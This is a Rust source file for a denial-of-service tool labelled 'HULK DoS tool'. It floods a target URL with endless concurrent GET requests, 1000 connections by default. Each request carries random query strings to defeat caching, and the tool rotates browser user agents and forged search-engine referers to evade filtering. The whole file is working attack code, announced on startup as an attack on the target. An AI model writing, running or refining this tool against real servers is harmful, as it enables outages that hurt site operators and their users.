use clap::Parser;
use hyper::{Client, Request, Body};
use hyper::body::HttpBody as _;
use rand::{thread_rng, Rng};
use rand::distributions::Alphanumeric;
use futures::future::join_all;
use hyper_tls::HttpsConnector;
use std::sync::atomic::{AtomicUsize, Ordering};
use std::io;
use std::io::Write;

static REQ_COUNT: AtomicUsize = AtomicUsize::new(0);
static ERR_COUNT: AtomicUsize = AtomicUsize::new(0);
static USER_AGENTS: &'static [&'static str] = &[
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Windows NT 10.0; rv:91.0) Gecko/20100101 Firefox/91.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:96.0) Gecko/20100101 Firefox/96.0",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.71 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/15.2 Safari/605.1.15",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36 Edg/97.0.1072.69",
    "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/97.0.4692.99 Safari/537.36",
    "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:96.0) Gecko/20100101 Firefox/96.0",
    ];
static REFERERS: &'static [&'static str] = &[
    "https://www.google.com/?q=",
    "https://bing.com/search?q=",
    "https://yandex.ru/yandsearch?text=",
    ];

#[derive(Parser, Debug)]
#[clap(author = "Hexalyse", about = "HULK DoS tool")]
struct CliArguments {
    #[clap(short, long, default_value = "1000")]
    /// Maximum number of concurrent connections to the target
    max_connections: usize,
    /// Target URL (eg. http://example.com)
    target: String,
    /// verbose mode (display HTTP error codes)
    #[clap(short, long, takes_value = false, required = false)]
    verbose: bool,
}

fn random_string(n: usize) -> String {
    thread_rng().sample_iter(&Alphanumeric)
                .take(n)
                .map(char::from)
                .collect()
}

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let args = CliArguments::parse();

    // let tasks = (0..args.max_connections).map(|x| {
    //     fetch_url(args.target.clone(), x)
    // });
    // join_all(tasks).await;
    println!("[*] Starting HULK attack on {}", args.target);
    let tasks = (0..args.max_connections).map(|x| {
        let target = args.target.clone();
        tokio::spawn(async move {
            fetch_url(target, args.verbose, x).await
        })
    });
    join_all(tasks).await;
    
    Ok(())
}

async fn fetch_url(target: String, verbose: bool, _thread: usize) -> Result<(), Box<dyn std::error::Error + Send + Sync>> {
    let https = HttpsConnector::new();
    let client = Client::builder()
        .build::<_, hyper::Body>(https);

    loop {
        let uri = if target.contains("?") { format!("{}&{}={}", target, random_string(10), random_string(10)) } else { format!("{}?{}={}", target, random_string(10), random_string(10)) };
        let referer = format!("{}{}", REFERERS[rand::thread_rng().gen_range(0..REFERERS.len())], random_string(rand::thread_rng().gen_range(5..10)));
        let request = Request::get(uri)
            .header("User-Agent", USER_AGENTS[rand::thread_rng().gen_range(0..USER_AGENTS.len())])
            .header("Referer", referer)
            .body(Body::empty())?;

        let mut resp = client.request(request).await?;
        if resp.status() != hyper::StatusCode::OK {
            if verbose {
                println!("\n[!] Error: {}", resp.status());
            }
            ERR_COUNT.fetch_add(1, Ordering::Relaxed);
        }
        let total_reqs = REQ_COUNT.fetch_add(1, Ordering::Relaxed) + 1;
        if total_reqs % 100 == 0 {
            let err_count = ERR_COUNT.load(Ordering::Relaxed);
            // sometimes the error count is higher than total requests, so we need to check for that not to get a substract with overflow
            let ok_count = if total_reqs >= err_count { total_reqs - err_count } else { 0 };
            print!("\r[*] {} requests | {} OK | {} errors", total_reqs, ok_count, err_count);
            io::stdout().flush().unwrap();
        }
        
        resp.body_mut().data().await;
    }
}